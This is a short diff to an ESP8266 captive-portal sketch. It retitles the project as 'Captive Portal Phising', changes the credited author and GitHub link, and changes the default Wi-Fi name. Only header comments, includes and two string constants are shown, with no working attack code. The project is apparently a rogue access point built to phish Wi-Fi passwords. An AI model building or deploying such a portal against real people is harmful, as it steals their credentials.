@@ -1,5 +1,5 @@
-// ESP8266 WiFi Captive Portal
-// By 125K (github.com/125K)
+// ESP8266 WiFi Captive Portal Phising
+// By  (github.com/Cyber-Ron)
 
 // Libraries
 #include <ESP8266WiFi.h>
@@ -8,7 +8,7 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Cryptors";
+const char* SSID_NAME = "Cyber-Ron";
 
 // Default main strings
 #define SUBTITLE "Router info."
